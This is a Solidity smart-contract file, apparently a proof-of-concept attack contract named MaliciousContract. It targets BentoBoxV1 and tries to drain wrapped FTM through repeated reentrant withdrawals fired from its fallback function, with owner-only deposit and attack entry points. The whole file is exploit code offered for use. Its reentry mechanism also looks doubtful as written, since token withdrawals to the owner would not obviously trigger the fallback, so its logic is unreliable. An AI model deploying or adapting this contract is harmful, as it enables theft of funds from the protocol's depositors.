// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./BentoBoxV1.sol";

contract MaliciousContract {
    BentoBoxV1 public target;
    address payable public owner;
    IERC20 public wftmToken;
    
    uint256 public reentryCount;
    uint256 public reentrancyLimit;

    constructor(address payable _target, address _wftmToken, uint256 _reentrancyLimit) public {
        target = BentoBoxV1(_target);
        wftmToken = IERC20(_wftmToken);
        owner = msg.sender;
        reentrancyLimit = _reentrancyLimit; // Set a reentrancy limit to control exact withdrawals
    }

    // Fallback function to trigger reentrancy with a specific limit
    fallback() external payable {
        if (reentryCount < reentrancyLimit && wftmToken.balanceOf(address(target)) >= 1 ether) {
            reentryCount++;
            target.withdraw(wftmToken, address(this), owner, 1 ether, 0);
        }
    }

    // Optional: receive function to accept Ether
    receive() external payable {}

    function deposit(uint256 _amount) external {
        require(msg.sender == owner, "Only owner can deposit");
        
        // Approve BentoBox to spend wFTM from this contract
        wftmToken.approve(address(target), _amount);

        // Initial deposit of wFTM to BentoBox
        target.deposit(wftmToken, address(this), address(this), _amount, 0);
    }

    function attack(uint256 _amount, uint256 _reentrancyLimit) external payable {
        require(msg.sender == owner, "Not the owner");

        // Set the reentrancy limit to target a specific number of tokens
        reentrancyLimit = _reentrancyLimit;
        reentryCount = 0; // Reset reentry count before starting attack

        // Initiate the attack
        target.withdraw(wftmToken, address(this), owner, _amount, 0);
    }

    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        owner.transfer(address(this).balance);
    }
}
